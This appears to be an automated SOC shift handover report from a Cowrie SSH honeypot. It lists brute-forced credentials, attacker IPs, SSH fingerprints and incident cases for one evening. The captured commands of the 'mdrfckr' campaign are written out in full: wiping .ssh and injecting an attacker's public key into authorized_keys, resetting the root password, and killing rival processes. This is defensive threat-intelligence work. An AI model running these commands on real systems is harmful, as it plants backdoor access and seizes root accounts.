# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-14 |
| **Generated At** | 2026-05-14T19:55:32Z |
| **Shift Time** | 19:55 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **136** |
| Confirmed Threats | **124** |
| False Positives Filtered | **12** (8.8%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **9** |
| High Severity Cases | **35** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **101** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **68** |
| Unique Credential Pairs | **35** |
| Unique Usernames | **18** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **24** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 35 |
| `345gs5662d34` | 17 |
| `...` | 1 |
| `xhl2g06n` | 1 |
| `pakchoi` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 17 |
| `3245gs5662d34` | 16 |
| `rahasia123` | 2 |
| `linux123` | 2 |
| `kermit` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 17 |
| `root` | `3245gs5662d34` | 16 |
| `root` | `rahasia123` | 2 |
| `root` | `linux123` | 2 |
| `root` | `kermit` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `rahasia123` | `106.251.244.178` | 2026-05-14T18:34:36 |
| `root` | `3245gs5662d34` | `106.251.244.178` | 2026-05-14T18:34:40 |
| `root` | `kermit` | `101.126.55.67` | 2026-05-14T18:41:14 |
| `root` | `huawei!@` | `101.126.55.67` | 2026-05-14T18:41:52 |
| `root` | `3245gs5662d34` | `101.126.55.67` | 2026-05-14T18:41:58 |
| `root` | `dbmaker` | `101.126.55.67` | 2026-05-14T18:47:35 |
| `root` | `elias` | `101.126.55.67` | 2026-05-14T18:49:26 |
| `root` | `linux123` | `101.126.55.67` | 2026-05-14T18:50:04 |
| `root` | `mju76yhn` | `101.126.55.67` | 2026-05-14T18:50:37 |
| `root` | `1q2w3e4r!` | `101.126.55.67` | 2026-05-14T18:51:50 |
| `root` | `angels` | `101.126.55.67` | 2026-05-14T18:52:28 |
| `root` | `lionel` | `101.126.55.67` | 2026-05-14T18:53:03 |
| `root` | `localhost` | `101.126.55.67` | 2026-05-14T18:54:15 |
| `root` | `rahasia123` | `101.126.55.67` | 2026-05-14T18:54:54 |
| `root` | `hes` | `101.126.55.67` | 2026-05-14T18:55:30 |
| `root` | `q1w2Q!W@` | `36.134.208.91` | 2026-05-14T19:29:19 |
| `root` | `3245gs5662d34` | `36.134.208.91` | 2026-05-14T19:29:24 |
| `root` | `qwert12345` | `14.103.117.105` | 2026-05-14T19:34:21 |
| `root` | `3245gs5662d34` | `14.103.117.105` | 2026-05-14T19:34:37 |
| `root` | `ABC@123456` | `187.94.255.130` | 2026-05-14T19:35:59 |
| `root` | `3245gs5662d34` | `187.94.255.130` | 2026-05-14T19:36:08 |
| `root` | `admin123456!` | `187.94.255.130` | 2026-05-14T19:37:28 |
| `root` | `linux123` | `187.94.255.130` | 2026-05-14T19:46:27 |
| `root` | `welcome@2025` | `187.94.255.130` | 2026-05-14T19:52:32 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **136** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 88 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 49 | 1 |
| `f555226df196...` | Mirai/variant | 34 | 4 |
| `c1953cec4623...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 49 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 34 | 4 | Mirai/variant |
| `c1953cec4623...` | libssh | 3 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 15 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:b37mMKdPIC3Z"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.55.67`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `106.251.244.178`, `187.94.255.130`, `101.126.55.67`, `36.134.208.91`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **17** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |
| `AS265083` | UltraWeb Telecomunicações LTDA | 1 | LOW |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS11556` | Cable & Wireless Panama | 1 | LOW |
| `AS7922` | Comcast Cable Communications, LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (35)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1376aa0ce566

| Field | Detail |
|---|---|
| **Source IP** | `106.251.244[.]178` |
| **First Seen** | 2026-05-14 18:34 |
| **Last Seen** | 2026-05-14 18:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:34:35` | `cowrie.session.connect` |
| `2026-05-14 18:34:35` | `cowrie.client.version` |
| `2026-05-14 18:34:35` | `cowrie.client.kex` |
| `2026-05-14 18:34:36` | `cowrie.login.success` |
| `2026-05-14 18:34:36` | `cowrie.session.params` |
| `2026-05-14 18:34:36` | `cowrie.command.input` |
| `2026-05-14 18:34:36` | `cowrie.command.failed` |
| `2026-05-14 18:34:37` | `cowrie.log.closed` |
| `2026-05-14 18:34:37` | `cowrie.session.params` |
| `2026-05-14 18:34:37` | `cowrie.command.input` |
| `2026-05-14 18:34:37` | `cowrie.session.file_download` |
| `2026-05-14 18:34:37` | `cowrie.log.closed` |
| `2026-05-14 18:34:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.251.244[.]178` to AbuseIPDB if not already reported
- [ ] Block `106.251.244[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c6a21905c35

| Field | Detail |
|---|---|
| **Source IP** | `106.251.244[.]178` |
| **First Seen** | 2026-05-14 18:34 |
| **Last Seen** | 2026-05-14 18:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:34:39` | `cowrie.session.connect` |
| `2026-05-14 18:34:39` | `cowrie.client.version` |
| `2026-05-14 18:34:39` | `cowrie.client.kex` |
| `2026-05-14 18:34:40` | `cowrie.login.success` |
| `2026-05-14 18:34:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.251.244[.]178` to AbuseIPDB if not already reported
- [ ] Block `106.251.244[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b881cbf3f0d

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:41 |
| **Last Seen** | 2026-05-14 18:41 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:b37mMKdPIC3Z"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:41:14` | `cowrie.session.connect` |
| `2026-05-14 18:41:14` | `cowrie.client.version` |
| `2026-05-14 18:41:14` | `cowrie.client.kex` |
| `2026-05-14 18:41:14` | `cowrie.login.success` |
| `2026-05-14 18:41:15` | `cowrie.session.params` |
| `2026-05-14 18:41:15` | `cowrie.command.input` |
| `2026-05-14 18:41:15` | `cowrie.command.failed` |
| `2026-05-14 18:41:15` | `cowrie.log.closed` |
| `2026-05-14 18:41:15` | `cowrie.session.params` |
| `2026-05-14 18:41:15` | `cowrie.command.input` |
| `2026-05-14 18:41:15` | `cowrie.session.file_download` |
| `2026-05-14 18:41:15` | `cowrie.log.closed` |
| `2026-05-14 18:41:28` | `cowrie.session.params` |
| `2026-05-14 18:41:28` | `cowrie.command.input` |
| `2026-05-14 18:41:28` | `cowrie.log.closed` |
| `2026-05-14 18:41:28` | `cowrie.session.params` |
| `2026-05-14 18:41:28` | `cowrie.command.input` |
| `2026-05-14 18:41:29` | `cowrie.log.closed` |
| `2026-05-14 18:41:29` | `cowrie.session.params` |
| `2026-05-14 18:41:29` | `cowrie.command.input` |
| `2026-05-14 18:41:29` | `cowrie.session.file_download` |
| `2026-05-14 18:41:29` | `cowrie.log.closed` |
| `2026-05-14 18:41:29` | `cowrie.session.params` |
| `2026-05-14 18:41:29` | `cowrie.command.input` |
| `2026-05-14 18:41:30` | `cowrie.log.closed` |
| `2026-05-14 18:41:30` | `cowrie.session.params` |
| `2026-05-14 18:41:30` | `cowrie.command.input` |
| `2026-05-14 18:41:30` | `cowrie.log.closed` |
| `2026-05-14 18:41:31` | `cowrie.session.params` |
| `2026-05-14 18:41:31` | `cowrie.command.input` |
| `2026-05-14 18:41:31` | `cowrie.command.input` |
| `2026-05-14 18:41:31` | `cowrie.log.closed` |
| `2026-05-14 18:41:31` | `cowrie.session.params` |
| `2026-05-14 18:41:31` | `cowrie.command.input` |
| `2026-05-14 18:41:31` | `cowrie.log.closed` |
| `2026-05-14 18:41:32` | `cowrie.session.params` |
| `2026-05-14 18:41:32` | `cowrie.command.input` |
| `2026-05-14 18:41:33` | `cowrie.log.closed` |
| `2026-05-14 18:41:33` | `cowrie.session.params` |
| `2026-05-14 18:41:33` | `cowrie.command.input` |
| `2026-05-14 18:41:33` | `cowrie.log.closed` |
| `2026-05-14 18:41:34` | `cowrie.session.params` |
| `2026-05-14 18:41:34` | `cowrie.command.input` |
| `2026-05-14 18:41:34` | `cowrie.log.closed` |
| `2026-05-14 18:41:34` | `cowrie.session.params` |
| `2026-05-14 18:41:34` | `cowrie.command.input` |
| `2026-05-14 18:41:34` | `cowrie.log.closed` |
| `2026-05-14 18:41:35` | `cowrie.session.params` |
| `2026-05-14 18:41:35` | `cowrie.command.input` |
| `2026-05-14 18:41:35` | `cowrie.log.closed` |
| `2026-05-14 18:41:36` | `cowrie.session.params` |
| `2026-05-14 18:41:36` | `cowrie.command.input` |
| `2026-05-14 18:41:36` | `cowrie.log.closed` |
| `2026-05-14 18:41:37` | `cowrie.session.params` |
| `2026-05-14 18:41:37` | `cowrie.command.input` |
| `2026-05-14 18:41:37` | `cowrie.log.closed` |
| `2026-05-14 18:41:38` | `cowrie.session.params` |
| `2026-05-14 18:41:38` | `cowrie.command.input` |
| `2026-05-14 18:41:39` | `cowrie.log.closed` |
| `2026-05-14 18:41:39` | `cowrie.session.params` |
| `2026-05-14 18:41:39` | `cowrie.command.input` |
| `2026-05-14 18:41:39` | `cowrie.log.closed` |
| `2026-05-14 18:41:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eca89f1b3d7

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:41 |
| **Last Seen** | 2026-05-14 18:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:41:51` | `cowrie.session.connect` |
| `2026-05-14 18:41:52` | `cowrie.client.version` |
| `2026-05-14 18:41:52` | `cowrie.client.kex` |
| `2026-05-14 18:41:52` | `cowrie.login.success` |
| `2026-05-14 18:41:53` | `cowrie.session.params` |
| `2026-05-14 18:41:53` | `cowrie.command.input` |
| `2026-05-14 18:41:53` | `cowrie.command.failed` |
| `2026-05-14 18:41:53` | `cowrie.log.closed` |
| `2026-05-14 18:41:53` | `cowrie.session.params` |
| `2026-05-14 18:41:53` | `cowrie.command.input` |
| `2026-05-14 18:41:54` | `cowrie.session.file_download` |
| `2026-05-14 18:41:54` | `cowrie.log.closed` |
| `2026-05-14 18:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85dfc274b4b2

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:41 |
| **Last Seen** | 2026-05-14 18:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:41:56` | `cowrie.session.connect` |
| `2026-05-14 18:41:56` | `cowrie.client.version` |
| `2026-05-14 18:41:56` | `cowrie.client.kex` |
| `2026-05-14 18:41:58` | `cowrie.login.success` |
| `2026-05-14 18:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f770a29e092

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:47 |
| **Last Seen** | 2026-05-14 18:48 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:MfNI2x17sF5d"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:47:35` | `cowrie.session.connect` |
| `2026-05-14 18:47:35` | `cowrie.client.version` |
| `2026-05-14 18:47:35` | `cowrie.client.kex` |
| `2026-05-14 18:47:35` | `cowrie.login.success` |
| `2026-05-14 18:47:36` | `cowrie.session.params` |
| `2026-05-14 18:47:36` | `cowrie.command.input` |
| `2026-05-14 18:47:36` | `cowrie.command.failed` |
| `2026-05-14 18:47:36` | `cowrie.log.closed` |
| `2026-05-14 18:47:36` | `cowrie.session.params` |
| `2026-05-14 18:47:36` | `cowrie.command.input` |
| `2026-05-14 18:47:36` | `cowrie.session.file_download` |
| `2026-05-14 18:47:36` | `cowrie.log.closed` |
| `2026-05-14 18:47:51` | `cowrie.session.params` |
| `2026-05-14 18:47:51` | `cowrie.command.input` |
| `2026-05-14 18:47:51` | `cowrie.log.closed` |
| `2026-05-14 18:47:52` | `cowrie.session.params` |
| `2026-05-14 18:47:52` | `cowrie.command.input` |
| `2026-05-14 18:47:52` | `cowrie.log.closed` |
| `2026-05-14 18:47:52` | `cowrie.session.params` |
| `2026-05-14 18:47:52` | `cowrie.command.input` |
| `2026-05-14 18:47:52` | `cowrie.session.file_download` |
| `2026-05-14 18:47:52` | `cowrie.log.closed` |
| `2026-05-14 18:47:53` | `cowrie.session.params` |
| `2026-05-14 18:47:53` | `cowrie.command.input` |
| `2026-05-14 18:47:53` | `cowrie.log.closed` |
| `2026-05-14 18:47:53` | `cowrie.session.params` |
| `2026-05-14 18:47:53` | `cowrie.command.input` |
| `2026-05-14 18:47:54` | `cowrie.log.closed` |
| `2026-05-14 18:47:54` | `cowrie.session.params` |
| `2026-05-14 18:47:54` | `cowrie.command.input` |
| `2026-05-14 18:47:54` | `cowrie.command.input` |
| `2026-05-14 18:47:55` | `cowrie.log.closed` |
| `2026-05-14 18:47:55` | `cowrie.session.params` |
| `2026-05-14 18:47:55` | `cowrie.command.input` |
| `2026-05-14 18:47:56` | `cowrie.log.closed` |
| `2026-05-14 18:47:57` | `cowrie.session.params` |
| `2026-05-14 18:47:57` | `cowrie.command.input` |
| `2026-05-14 18:47:57` | `cowrie.log.closed` |
| `2026-05-14 18:47:57` | `cowrie.session.params` |
| `2026-05-14 18:47:57` | `cowrie.command.input` |
| `2026-05-14 18:47:57` | `cowrie.log.closed` |
| `2026-05-14 18:47:58` | `cowrie.session.params` |
| `2026-05-14 18:47:58` | `cowrie.command.input` |
| `2026-05-14 18:47:58` | `cowrie.log.closed` |
| `2026-05-14 18:47:58` | `cowrie.session.params` |
| `2026-05-14 18:47:58` | `cowrie.command.input` |
| `2026-05-14 18:47:59` | `cowrie.log.closed` |
| `2026-05-14 18:47:59` | `cowrie.session.params` |
| `2026-05-14 18:47:59` | `cowrie.command.input` |
| `2026-05-14 18:47:59` | `cowrie.log.closed` |
| `2026-05-14 18:48:00` | `cowrie.session.params` |
| `2026-05-14 18:48:00` | `cowrie.command.input` |
| `2026-05-14 18:48:00` | `cowrie.log.closed` |
| `2026-05-14 18:48:00` | `cowrie.session.params` |
| `2026-05-14 18:48:00` | `cowrie.command.input` |
| `2026-05-14 18:48:01` | `cowrie.log.closed` |
| `2026-05-14 18:48:01` | `cowrie.session.params` |
| `2026-05-14 18:48:01` | `cowrie.command.input` |
| `2026-05-14 18:48:01` | `cowrie.log.closed` |
| `2026-05-14 18:48:01` | `cowrie.session.params` |
| `2026-05-14 18:48:01` | `cowrie.command.input` |
| `2026-05-14 18:48:02` | `cowrie.log.closed` |
| `2026-05-14 18:48:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-473069c54962

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:49 |
| **Last Seen** | 2026-05-14 18:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:49:25` | `cowrie.session.connect` |
| `2026-05-14 18:49:25` | `cowrie.client.version` |
| `2026-05-14 18:49:25` | `cowrie.client.kex` |
| `2026-05-14 18:49:26` | `cowrie.login.success` |
| `2026-05-14 18:49:26` | `cowrie.session.params` |
| `2026-05-14 18:49:26` | `cowrie.command.input` |
| `2026-05-14 18:49:26` | `cowrie.command.failed` |
| `2026-05-14 18:49:26` | `cowrie.log.closed` |
| `2026-05-14 18:49:27` | `cowrie.session.params` |
| `2026-05-14 18:49:27` | `cowrie.command.input` |
| `2026-05-14 18:49:27` | `cowrie.session.file_download` |
| `2026-05-14 18:49:27` | `cowrie.log.closed` |
| `2026-05-14 18:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
